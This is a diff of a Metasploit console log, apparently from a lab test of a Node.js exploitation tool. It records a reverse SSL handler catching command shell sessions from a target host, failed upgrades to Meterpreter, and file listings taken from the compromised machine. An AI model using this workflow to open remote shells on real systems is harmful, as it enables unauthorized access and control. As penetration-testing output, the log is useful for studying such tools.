@@ -3,16 +3,68 @@ resource (/home/kali/PycharmProjects/nodexp/scripts/nodejs_shell.rc)> exploit -j
 [0m[1m[34m[*][0m Exploit running as background job 0.
 [1m[34m[*][0m Exploit completed, but no session was created.
 [?1034h[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> 
-[1m[34m[*][0m Started bind TCP handler against 192.168.74.148:6565
-[1m[34m[*][0m Command shell session 1 opened (0.0.0.0:0 -> 192.168.74.148:6565) at 2020-06-02 19:34:30 -0400
-sessions -i
+[1m[34m[*][0m Started reverse SSL handler on 192.168.74.224:8484 
+[1m[34m[*][0m Command shell session 1 opened (192.168.74.224:8484 -> 192.168.74.148:36418) at 2020-06-03 12:51:38 -0400
+[1m[34m[*][0m Session ID 1 (192.168.74.224:8484 -> 192.168.74.148:36418) processing InitialAutoRunScript 'post/multi/manage/shell_to_meterpreter'
+[1m[33m[!][0m SESSION may not be compatible with this module.
+[1m[34m[*][0m Upgrading session ID: 1
+sessions 
 [0m
 Active sessions
 ===============
 
-  Id  Name  Type                 Information  Connection
-  --  ----  ----                 -----------  ----------
-  1         shell nodejs/nodejs               0.0.0.0:0 -> 192.168.74.148:6565 (192.168.74.148)
+  Id  Name  Type   Information  Connection
+  --  ----  ----   -----------  ----------
+  1         shell               192.168.74.224:8484 -> 192.168.74.148:36418 (192.168.74.148)
 
-[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> exit -y
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> session -i 1
+[0m[1m[31m[-][0m Unknown command: session.
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+
+[1m[31m[-][0m Shells on the target platform, , cannot be upgraded to Meterpreter at this time.
+[1m[34m[*][0m Command shell session 2 opened (192.168.74.224:8484 -> 192.168.74.148:36420) at 2020-06-03 12:52:24 -0400
+[1m[34m[*][0m Session ID 2 (192.168.74.224:8484 -> 192.168.74.148:36420) processing InitialAutoRunScript 'post/multi/manage/shell_to_meterpreter'
+[1m[33m[!][0m SESSION may not be compatible with this module.
+[1m[34m[*][0m Upgrading session ID: 2
+Usage: sessions <id>
+
+Interact with a different session Id.
+This command only accepts one positive numeric argument.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+
+Usage: sessions <id>
+
+Interact with a different session Id.
+This command only accepts one positive numeric argument.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+
+
+Abort session 1? [y/N]  
+[1m[34m[*][0m 192.168.74.148 - Command shell session 1 closed.  Reason: User exit
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> session -i
+[0m[1m[31m[-][0m Unknown command: session.
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> show sessions
 [0m
+Active sessions
+===============
+
+  Id  Name  Type   Information  Connection
+  --  ----  ----   -----------  ----------
+  2         shell               192.168.74.224:8484 -> 192.168.74.148:36420 (192.168.74.148)
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> session -i 1[K2
+[0m[1m[31m[-][0m Unknown command: session.
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions -i 2
+[0m[1m[34m[*][0m Starting interaction with 2...
+
+aKekQmDdSFodABGVOtbcyPAkpZbTldrl
+eval.js
+eval_with_keywords.js
+node_modules
+package.json
+eval.js
+eval_with_keywords.js
+node_modules
+package.json
